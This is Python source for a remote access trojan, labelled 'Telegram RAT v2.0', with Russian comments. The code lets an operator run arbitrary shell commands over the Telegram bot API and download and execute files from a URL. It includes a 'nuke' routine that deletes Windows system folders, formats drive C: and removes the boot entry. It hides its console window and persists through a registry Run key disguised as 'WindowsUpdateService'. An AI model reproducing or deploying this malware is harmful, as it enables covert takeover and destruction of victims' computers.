# ==================================================
# TELEGRAM RAT v2.0 - HORRY MOD
# Функционал: CMD Shell, Nuke Windows, Download & Execute
# ==================================================

import os
import sys
import subprocess
import requests
import json
import threading
import time
import shutil
import platform
import ctypes
from pathlib import Path

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "8670575283:AAF9osd3G4BaQGJ_QS5O_nbp9s3lED7tfHI"  # Замени на свой
CHAT_ID = "8677229375"      # Замени на свой
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

last_update_id = 0

# ==================== ФУНКЦИИ TELEGRAM ====================
def send_message(text):
    try:
        requests.post(f"{API_URL}/sendMessage", data={'chat_id': CHAT_ID, 'text': text[:4096]})
    except:
        pass

def send_file(filepath, caption=""):
    try:
        with open(filepath, 'rb') as f:
            requests.post(f"{API_URL}/sendDocument", data={'chat_id': CHAT_ID, 'caption': caption}, files={'document': f})
    except:
        pass

def get_updates(offset=None):
    params = {'timeout': 30, 'offset': offset}
    try:
        r = requests.get(f"{API_URL}/getUpdates", params=params, timeout=35)
        return r.json().get('result', [])
    except:
        return []

# ==================== КОМАНДНЫЙ ВЫПОЛНИТЕЛЬ ====================
def execute_cmd(command):
    """Выполняет команду CMD и возвращает вывод"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
        output = result.stdout + result.stderr
        if len(output) == 0:
            output = "[✓] Команда выполнена без вывода"
        return output[:4000]  # Telegram лимит
    except subprocess.TimeoutExpired:
        return "[-] Команда выполнялась слишком долго (60с)"
    except Exception as e:
        return f"[-] Ошибка: {str(e)}"

# ==================== УНИЧТОЖЕНИЕ WINDOWS (NUKE) ====================
def nuke_windows():
    """Деструктивная операция — удаление системных файлов Windows"""
    send_message("[💀] Инициирован протокол NUKE. Windows будет уничтожена...")
    
    # Несколько способов для надежности
    commands = [
        'cmd /c del /f /s /q C:\\Windows\\System32\\*.* 2>nul',           # Удаление System32
        'cmd /c rd /s /q C:\\Windows\\System32 2>nul',                     # Удаление папки System32
        'cmd /c del /f /s /q C:\\Windows\\*.* 2>nul',                      # Удаление всей Windows
        'cmd /c format C: /q /y 2>nul',                                    # Форматирование диска C
        'cmd /c bcdedit /delete {current} /f 2>nul',                       # Удаление загрузчика
        'cmd /c shutdown /s /f /t 5',                                      # Принудительное выключение
    ]
    
    for cmd in commands:
        try:
            subprocess.run(cmd, shell=True, timeout=3)
        except:
            pass
    
    # Альтернатива: создание скрипта для полного уничтожения
    nuke_script = """
@echo off
takeown /f C:\\Windows /r /d y 2>nul
icacls C:\\Windows /grant %username%:F /t /q 2>nul
del /f /s /q C:\\Windows\\*.* 2>nul
rd /s /q C:\\Windows 2>nul
shutdown /s /f /t 0
"""
    script_path = os.environ['TEMP'] + "\\nuke.bat"
    with open(script_path, 'w') as f:
        f.write(nuke_script)
    
    subprocess.Popen([script_path], shell=True)
    send_message("[💀] NUKE завершен. Система будет уничтожена после перезагрузки.")

# ==================== ЗАГРУЗКА И ЗАПУСК ФАЙЛА ПО ССЫЛКЕ ====================
def download_and_execute(url):
    """Скачивает файл по ссылке и запускает его"""
    try:
        send_message(f"[📥] Загрузка файла: {url[:100]}")
        
        # Определяем имя файла
        filename = url.split('/')[-1].split('?')[0]
        if not filename or '.' not in filename:
            filename = "payload.exe"
        
        save_path = os.environ['TEMP'] + "\\" + filename
        
        # Скачиваем
        response = requests.get(url, timeout=60, stream=True)
        if response.status_code == 200:
            with open(save_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            send_message(f"[✅] Файл сохранен: {save_path}")
            
            # Запускаем
            os.startfile(save_path)
            send_message("[▶️] Файл запущен")
        else:
            send_message(f"[-] Ошибка загрузки: HTTP {response.status_code}")
    except Exception as e:
        send_message(f"[-] Ошибка: {str(e)}")

# ==================== ТЕЛЕГРАМ БОТ — ОБРАБОТЧИК КОМАНД ====================
def process_command(text):
    text = text.strip().lower()
    
    # /cmd <команда> — выполнить команду CMD
    if text.startswith("/cmd"):
        command = text[4:].strip()
        if command:
            result = execute_cmd(command)
            send_message(f"📟 CMD:\n$ {command}\n\n{result}")
        else:
            send_message("Использование: /cmd <команда>\nПример: /cmd dir C:\\")
    
    # /nuke — уничтожить Windows
    elif text == "/nuke":
        confirm_msg = send_message("⚠️ ПОДТВЕРДИТЕ УНИЧТОЖЕНИЕ WINDOWS ⚠️\nВведите /confirm_nuke в течение 30 секунд")
        threading.Timer(30.0, lambda: send_message("[⏰] Время вышло, уничтожение отменено")).start()
        # Простой подход: ожидаем следующую команду
        return "await_nuke"
    
    elif text == "/confirm_nuke":
        send_message("[💀] ПОДТВЕРЖДЕНО. Запуск NUKE...")
        nuke_windows()
    
    # /download <url> — скачать и запустить файл
    elif text.startswith("/download"):
        url = text[9:].strip()
        if url.startswith("http://") or url.startswith("https://"):
            threading.Thread(target=download_and_execute, args=(url,), daemon=True).start()
        else:
            send_message("[-] Некорректная ссылка. Используйте: /download https://example.com/file.exe")
    
    # /help — справка
    elif text == "/help":
        help_text = """
🤖 **Telegram RAT v2.0 - Доступные команды:**

/cmd <команда> — выполнить команду CMD
  Пример: /cmd ipconfig

/download <url> — скачать и запустить файл
  Пример: /download https://example.com/malware.exe

/nuke — УНИЧТОЖИТЬ WINDOWS (требует подтверждения)

/help — показать это сообщение
"""
        send_message(help_text)
    
    else:
        send_message("Неизвестная команда. Используйте /help")
    
    return None

# ==================== ПОСТОЯННАЯ РАБОТА БОТА ====================
def bot_loop():
    global last_update_id
    send_message("[🟢] Telegram RAT активирован. Используйте /help для списка команд")
    
    pending_nuke = False
    
    while True:
        try:
            updates = get_updates(offset=last_update_id + 1 if last_update_id else None)
            
            for update in updates:
                last_update_id = update.get('update_id')
                message = update.get('message', {})
                
                # Проверяем, что сообщение от нужного пользователя
                if message.get('chat', {}).get('id') == CHAT_ID:
                    text = message.get('text', '')
                    if text:
                        result = process_command(text)
                        if result == "await_nuke":
                            pending_nuke = True
            
            time.sleep(1)
        except Exception as e:
            time.sleep(5)

# ==================== ПЕРСИСТЕНТНОСТЬ ====================
def add_to_startup():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
        winreg.CloseKey(key)
    except:
        pass

def hide_console():
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ==================== MAIN ====================
if __name__ == "__main__":
    hide_console()
    add_to_startup()
    
    # Запускаем бота в отдельном потоке
    bot_thread = threading.Thread(target=bot_loop, daemon=True)
    bot_thread.start()
    
    # Держим поток живым
    while True:
        time.sleep(3600)
